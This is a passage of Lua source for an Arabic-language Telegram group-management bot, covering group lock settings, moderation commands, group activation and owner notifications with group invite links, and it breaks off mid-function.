if faederdx1:get(FAEDER.."fshar"..msg.chat_id_) then mute_fshar = 'مفعل ✔️' else mute_fshar = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER.."taf"..msg.chat_id_) then mute_taf = 'مفعل ✔️' else mute_taf = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER.."kaf"..msg.chat_id_) then mute_kaf = 'مفعل ✔️' else mute_kaf = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:muteall'..msg.chat_id_) then mute_all = 'مفعل ✔️' else mute_all = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:text:mute'..msg.chat_id_) then mute_text = 'مفعل ✔️' else mute_text = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مفعل ✔️' else mute_photo = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:video:mute'..msg.chat_id_) then mute_video = 'مفعل ✔️' else mute_video = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مفعل ✔️' else mute_gifs = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then mute_flood = 'مفعل ✔️' else mute_flood = 'معطل ✖️' end
------------faeder
if not faederdx1:get(FAEDER..'flood:max:'..msg.chat_id_) then
flood_m = 5 else
flood_m = faederdx1:get(FAEDER..'flood:max:'..msg.chat_id_) end
------------faeder
if not faederdx1:get(FAEDER..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250 else
spam_c = faederdx1:get(FAEDER..'bot:sens:spam'..msg.chat_id_) end
------------faeder
if faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالمسح"
elseif faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد"
elseif not faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) then
floodstatus = "بالمسح" end
------------faeder
if faederdx1:get(FAEDER..'bot:music:mute'..msg.chat_id_) then mute_music = 'مفعل ✔️' else mute_music = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:bots:ban'..msg.chat_id_) then mute_bots = 'مفعل ✔️' else mute_bots = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مفعل ✔️' else mute_in = 'معطل ✖️' end
------------faeder 
if faederdx1:get(FAEDER..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مفعل ✔️' else mute_cmd = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مفعل ✔️' else mute_voice = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'editmsg'..msg.chat_id_) then mute_edit = 'مفعل ✔️' else mute_edit = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then mute_links = 'مفعل ✔️' else mute_links = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مفعل ✔️' else lock_pin = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مفعل ✔️' else lock_sticker = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مفعل ✔️' else lock_tgservice = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مفعل ✔️' else lock_wp = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then strict = 'مفعل ✔️' else strict = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then lock_htag = 'مفعل ✔️' else lock_htag = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then lock_tag = 'مفعل ✔️' else lock_tag = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:location:mute'..msg.chat_id_) then lock_location = 'مفعل ✔️' else lock_location = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مفعل ✔️' else lock_contact = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then lock_english = 'مفعل ✔️' else lock_english = 'معطل ✖️' end
------------fader
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مفعل ✔️' else lock_arabic = 'معطل ✖️' end
------------fader
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مفعل ✔️' else lock_forward = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:document:mute'..msg.chat_id_) then lock_file = 'مفعل ✔️' else lock_file = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'markdown:lock'..msg.chat_id_) then markdown = 'مفعل ✔️' else markdown = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مفعل ✔️' else lock_spam = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER.."bot:welcome"..msg.chat_id_) then send_welcome = 'مفعل ✔️' else send_welcome = 'معطل ✖️' end
------------faeder
local TXTAR = "↫ اعدادات المجموعه  :\n         ───────────────\n"
.."↫ قفل الحمايه "..strict.."\n"
.."↫ قفل الكل "..mute_all.."\n"
.."↫ قفل الشارحه "..mute_cmd.."\n"
.."↫ قفل الكلايش "..lock_spam.."\n"
.."↫ قفل الروابط "..mute_links.."\n"
.."️↫ قفل الشبكات "..lock_wp.."\n"
.."↫ قفل المعرف "..lock_tag.."\n"
.."↫ قفل الالحاد "..mute_kaf.."\n"
.."↫ قفل السب "..mute_fshar.."\n"
.."↫ قفل الطائفيه "..mute_taf.."\n"
.."↫ قفل الهاشتاك "..lock_htag.."\n"
.."↫ قفل التوجيه "..lock_forward.."\n"
.."↫ قفل البوتات "..mute_bots.."\n"
.."↫ قفل التعديل "..mute_edit.."\n"
.."↫ قفل التثبيت "..lock_pin.."\n"
.."↫ قفل الاونلاين "..mute_in.."\n"
.."↫ قفل العربيه "..lock_arabic.."\n         ───────────────\n"
.."↫ قفل الانقليزيه "..lock_english.."\n"
.."↫ قفل الفارسيه "..mute_farsi.."\n"
.."↫ قفل الماركداون "..markdown.."\n"
.."️↫ قفل الاشعارات "..lock_tgservice.."\n"
.."↫ قفل الدردشه "..mute_text.."\n"
.."↫ قفل الصور "..mute_photo.."\n"
.."↫ قفل الفيديو "..mute_video.."\n"
.."↫ قفل المتحركه "..mute_gifs.."\n"
.."↫ قفل الاغاني  "..mute_music.."\n"
.."↫ قفل الصوت "..mute_voice.."\n"
.."↫ قفل الملفات "..lock_file.."\n"
.."↫ قفل الملصقات "..lock_sticker.."\n"
.."↫ قفل الجهات "..lock_contact.."\n"
.."️↫ قفل المواقع "..lock_location.."\n"
.."↫ قفل التكرار "..mute_flood.."\n"
.."↫ الفارسيه بالطرد "..mute_farsiban.."\n"
.."↫ البوتات بالطرد "..mute_botsban.."\n"
.."↫ البوتات بالتقيد "..mute_botske.."\n\n"
.."↫ وضع الترحيب "..send_welcome.."\n"
.."↫ خاصيه التكرار "..floodstatus.."\n"
.."↫ عدد التكرار [ "..flood_m.." ]\n"
.."️↫ عدد السبام [ "..spam_c.." ]\n"
.."         ───────────────\n↫ [LAKS - CH](https://t.me/badboy_here)\n"
faederdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end end 
--     By Developer Faeder     --
if text and text:match("^قول (.*)$")  then
local txt = {string.match(text, "^(قول) (.*)$")}
faederdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
--     By Developer Faeder     -- 
if (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل ردود البوت سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل ردود البوت ', 1, 'md')
faederdx1:del(FAEDER..'bot:rep:mute'..msg.chat_id_)
end end
if (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل ردود البوت سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل ردود البوت ', 1, 'md')
faederdx1:set(FAEDER..'bot:rep:mute'..msg.chat_id_,true)
end end
--     By Developer Faeder     -- 
if text and text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
faederdx1:set(FAEDER..'owner:note1', txt[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
end
--     By Developer Faeder     -- 
if text and text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = faederdx1:get(FAEDER..'owner:note1')
faederdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الروابط$") and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفوله '
else
mute_links = 'معطل '
end
local faeder = "┋ اعدادات الروابط  :\n\n"
.." الروابط : "..mute_links.."\n"
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end end
--     By Developer Faeder     -- 
if text and text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تغيير اسم المجموعه ', 1, 'md')
end
--     By Developer Faeder     -- 
if text and text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي الصوره الان ', 1, 'md')
faederdx1:set(FAEDER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     By Developer Faeder     -- 
if text and text:match('^المجموعات$') then
local list = faederdx1:smembers(FAEDER.."bot:groups")
local t = "↫ مجموعات البوت \n         ───────────────\n"
for k,v in pairs(list) do
t = t..k.." - {`"..v.."`}\n" 
end
if #list == 0 then
t = '↫ لا يوجد مجموعات مفعله '
end
faederdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
--     By Developer Faeder     -- 
if text and text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء تثبيت الرساله ', 1, 'md')
end
--     By Developer Faeder     -- 
if text and text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = faederdx1:get(FAEDER..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم اعاده تثبيت الرساله ', 1, 'md')
else end end       
--     By Developer Faeder     -- 
if text and text:match("^طرد الحسابات المحذوفه$") and faeder11(msg) or text and text:match("^طرد المحذوف$") and faeder11(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end end
getUser(v.user_id_, cleanaccounts, nil)
end 
faederdx(msg.chat_id_, msg.id_, 0,'↫ تم طرد الحسابات المحذوفه ', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     By Developer Faeder     -- 
if text and text:match("^تنظيف قائمه الحظر$") and faeder11(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
faederdx(msg.chat_id_, msg.id_, 0,'↫ لا يوجد محظورين ', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
x = x + 1
end 
faederdx(msg.chat_id_, msg.id_, 0,'↫ تم تنظيف قائمه حظر القروب ', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
--     By Developer Faeder     -- 
if text and text:match("^مسح المحظورين$") and faeder11(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
faederdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
x = x + 1
end 
faederdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
end end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end 
--     By Developer Faeder     -- 
if text and text:match("^معلومات المجموعه$") and faeder11(msg) then
function gpinfo(arg,data)
-- vardump(data) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ ايدي المجموعة ← ( '..msg.chat_id_..' )\n↫ عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n↫ عدد المحظورين ← ( *'..data.kicked_count_..' )*\n↫ عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end 
if text and text:match('^كشف (-%d+)') and faeder11(msg) then
local chattid = text:match('كشف (-%d+)') 
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطورين فقط ', 1, 'md')
else
function Faeder_re(arg,data)
function faeder(f1,f2)
function faeder333(t1,t2)
local list = faederdx1:smembers(FAEDER.."bot:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = faederdx1:get(FAEDER.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then
monsh = user_info
else
monsh = "لا يوجد"
end
local Monsh = faederdx1:scard(FAEDER.."bot:monsh:" .. chattid) or "0"
local Baned = faederdx1:scard(FAEDER.."bot:banned:" .. chattid) or "0"
local Owner = faederdx1:scard(FAEDER.."bot:owners:" .. chattid) or "0"
local Muted = faederdx1:scard(FAEDER.."bot:muted:" .. chattid) or "0"
local Tkeed = faederdx1:scard(FAEDER.."bot:keed:" .. chattid) or "0"
local Momod = faederdx1:scard(FAEDER.."bot:momod:" .. chattid) or "0"
local Vip = faederdx1:scard(FAEDER.."bot:vipmem:" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end end
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@badboy_here")) 
faederdx(msg.chat_id_, msg.id_, 1, "↫ المنشئ ← ["..monsh.."]\n\n↫ الرابط ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/badboy_here")..")\n↫ ايديها ← *"..msg.chat_id_.."*\n↫ عدد الاعضاء ← *"..data.member_count_.."* \n↫ عدد المدراء ← *"..Owner.."*\n↫ عدد المنشئين ← *"..Monsh.."*\n↫ عدد الادمنيه ← *"..Momod.."*\n↫ عدد المكتومين ← *"..Muted.."*\n↫ عدد المحظورين ← *"..Baned.."*\n↫ عدد المقيدين ← *"..Tkeed.."*\n↫ عدد المميزين ← *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(chattid).ID
}, faeder333, nil)
end
openChat(msg.chat_id_,faeder) 
end
getChannelFull(chattid, Faeder_re, nil)
end end 
--     By Developer Faeder     -- 
if text and text:match("^غادر (-%d+)$")  and faeder11(msg) then
if not faederdx1:get(FAEDER..'lock:add'..msg.chat_id_) then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطورين فقط ', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
faederdx(msg.chat_id_, msg.id_, 1, "↫ المجموعه ← {" .. result.title_ .. "}\n↫ تمت المغادره منها بامر المطور ", 1, "md")
faederdx(txt[2], 0, 1, '↫ بامر من المطور تم مغادره المجموعه\n↫ لاستعاده البوت راسل المطور ادناه \n         ───────────────\n [↫ مطور البوت ](t.me/'..SudoFaeder..')', 1, 'md') 
chat_leave(result.id_, bot_id)
faederdx1:srem(FAEDER.."bot:groups", result.id_)
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
end end 
getChat(txt[2], leavegp) 
end end end 
--     By Developer Faeder     -- 
if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تفعيل منو ضافني'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:del(FAEDER..'Added:Me'..msg.chat_id_) 
end
if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تعطيل منو ضافني'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:set(FAEDER..'Added:Me'..msg.chat_id_,true)  
end
--     By Developer Faeder     -- 
if text == 'تفعيل البوت الخدمي' then 
local  faeder = '↫ تم تفعيل البوت الخدمي ' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:del(FAEDER..'lock:bot:free'..bot_id) 
end
if text == 'تعطيل البوت الخدمي' then 
faeder = '↫ تم تعطيل البوت الخدمي ' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:set(FAEDER..'lock:bot:free'..bot_id,true) 
end
--     By Developer Faeder     -- 
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطورين فقط ', 1, 'md')
else 
local  faeder = '↫ تم تفعيل التنبيه على تغيير\n↫ { صوره - اسم - معرف } الاعضاء\n↫ في كل مجموعات البوت' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:del(FAEDER..'lock:bot:ttt'..bot_id) 
end end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطورين فقط ', 1, 'md')
else 
faeder = '↫ تم تعطيل التنبيه على تغيير\n↫ { صوره - اسم - معرف } الاعضاء\n↫ في كل مجموعات البوت' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:set(FAEDER..'lock:bot:ttt'..bot_id,true) 
end end
if text and text == "تفعيل تنبيه التغيرات" and faeder11(msg) then
if faederdx1:get(FAEDER..'lock:bot:ttt'..bot_id) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ التنبيه على تغيير\n↫ { صوره - اسم - معرف } الاعضاء\n↫ معطل في كل القروبات من قبل المطور  ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لمدراء المجموعه فما فوق ', 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل التنبيه على تغيير\n↫ { صوره - اسم - معرف } الاعضاء\n↫ في هذه المجموعه  ', 1, 'md')
faederdx1:del(FAEDER.."lock:bot:ttt2:"..msg.chat_id_)
end end
if text and text == "تعطيل تنبيه التغيرات" and faeder11(msg) then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لمدراء المجموعه فما فوق ', 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل التنبيه على تغيير\n↫ { صوره - اسم - معرف } الاعضاء\n↫ في هذه المجموعه  ', 1, 'md')
faederdx1:set(FAEDER.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end end
--     By Developer Faeder     -- 
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then   
if faederdx1:get(FAEDER..'lock:get:photo'..msg.chat_id_) then
faeder = '*↫ تم تفعيل جلب الصوره الشخصيه '  
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:del(FAEDER..'lock:get:photo'..msg.chat_id_) 
else
faeder = '*↫ تم تفعيل جلب الصوره الشخصيه مسبقا '  
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
end end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then   
if not faederdx1:get(FAEDER..'lock:get:photo'..msg.chat_id_) then
faeder = '*↫ تم تعطيل جلب الصوره الشخصيه '  
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
faederdx1:set(FAEDER..'lock:get:photo'..msg.chat_id_,true) 
else
faeder = '*↫ تم تعطيل جلب الصوره الشخصيه مسبقا '  
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
end end
--     By Developer Faeder     -- 
if text and text == "تفعيل الرابط" and faeder11(msg) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل الرابط ', 1, 'md')
faederdx1:del(FAEDER.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and faeder11(msg) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الرابط ', 1, 'md')
faederdx1:set(FAEDER.."bot:tt:link:"..msg.chat_id_,"ok")
end
--     By Developer Faeder     -- 
if text and text:match('^تفعيل$') and faeder11(msg) and is_admin(msg.sender_user_id_, msg.chat_id_) then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
faederdx1:sadd(FAEDER.."bot:monsh:"..msg.chat_id_,owner_id)
end end end 
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER.."bot:enable:"..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ المجموعه : *'..title_name(msg.chat_id_)..'*\n↫ مفعله سابقا بالبوت .', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
openChat(msg.chat_id_,faeder)
faederdx1:sadd("faeder:addg"..bot_id, msg.chat_id_)
function faeder(f1,f2)
function faeder333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end end  
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫ تم تفعيل مجموعه جديده  \n↫ معرف المطور ← @"..(result.username_ or "لا يوجد").."\n↫ ايدي المطور ← `"..msg.sender_user_id_.."`\n↫ معلومات المجموعه  \n\n↫ اسم المجموعه ←  *"..f2.title_.."*\n↫ ايدي المجموعه ← `"..msg.chat_id_.."`\n↫ رابط المجموعه \n↫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, faeder333, nil)
end
openChat(msg.chat_id_,faeder) 
faederdx1:set(FAEDER.."bot:enable:"..msg.chat_id_,true)
faederdx1:setex(FAEDER.."bot:charge:"..msg.chat_id_,86400,true)
faederdx1:sadd("faeder:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end end end end
getUser(msg.sender_user_id_,adding)
end
--     By Developer Faeder     -- 
if text and text:match('^تعطيل$') and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local txt = {string.match(text, "^(تعطيل)$")}
if not faederdx1:get(FAEDER.."bot:enable:"..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ المجموعه : *'..title_name(msg.chat_id_)..'*\n↫ معطله سابقا بالبوت .', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ تم تعطيل المجموعه .', 1, 'md')
faederdx1:del(FAEDER.."bot:charge:"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:enable:"..msg.chat_id_)
faederdx1:srem("faeder:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end end
--     By Developer Faeder     -- 
if text and text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
faederdx1:del(FAEDER.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
--     By Developer Faeder     -- 
if text and text:match("^تفعيل كل القروبات$") and faeder11(msg) then
local gps = faederdx1:smembers(FAEDER.."bot:groups") or 0
local gps2 = faederdx1:smembers("faeder:addg"..bot_id) or 0
for i=1,#gps do
faederdx1:sadd("faeder:addg"..bot_id, gps[i])
faederdx1:set(FAEDER.."bot:enable:"..gps[i],true)
faederdx1:set( FAEDER.."bot:charge:"..gps[i],true)
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end
if text and text:match("^تعطيل كل القروبات$") and faeder11(msg) then
local gps = faederdx1:smembers(FAEDER.."bot:groups") or 0
local gps2 = faederdx1:smembers("faeder:addg"..bot_id) or 0
for i=1,#gps do
faederdx1:del("faeder:addg"..bot_id, gps[i])
faederdx1:del(FAEDER.."bot:enable:"..gps[i],true)
faederdx1:del( FAEDER.."bot:charge:"..gps[i],true)
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end   
--     By Developer Faeder     -- 
if text and text:match("^الدعم$") or text:match("^المطور$") and faeder11(msg) then
function adding(extra,result,success)
function faeder(f1,f2)
function faeder333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end end
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫ هناك من بحاجه للمساعده  \n↫ معرف الشخص ← @"..(result.username_ or "لا يوجد").."\n↫ ايدي الشخص ← `"..msg.sender_user_id_.."`\n↫ معلومات المجموعه  \n\n↫ اسم المجموعه ←  *"..f2.title_.."*\n↫ ايدي المجموعه ← `"..msg.chat_id_.."`\n↫ رابط المجموعه \n↫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, faeder333, nil)
end
openChat(msg.chat_id_,faeder) 
end
getUser(msg.sender_user_id_,adding)
end
--     By Developer Faeder     -- 
if text == 'جلب نسخه الملف' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطور الاساسي فقط ', 1, 'md')
else
if not faederdx1:get(FAEDER..'lock:add'..msg.chat_id_) then
sendDocument(bot_owner, 0, 0, 1, nil, './FAEDER.lua', dl_cb, nil)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if text == 'روابط القروبات' or text == 'روابط المجموعات' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطور الاساسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (faederdx1:scard(FAEDER.."bot:groups"))
local list = faederdx1:smembers(FAEDER.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_LAKS ~ @badboy_here\n\n"
for k,v in pairs(list) do
local GroupsMonsh = faederdx1:scard(FAEDER.."bot:monsh:"..v) or 0
local GroupsOwner = faederdx1:scard(FAEDER.."bot:owners:"..v) or 0
local GroupsMod = faederdx1:scard(FAEDER.."bot:momod:"..v) or 0
local Groupslink = faederdx1:get(FAEDER.."bot:group:link" ..v)
if result.first_name_ then
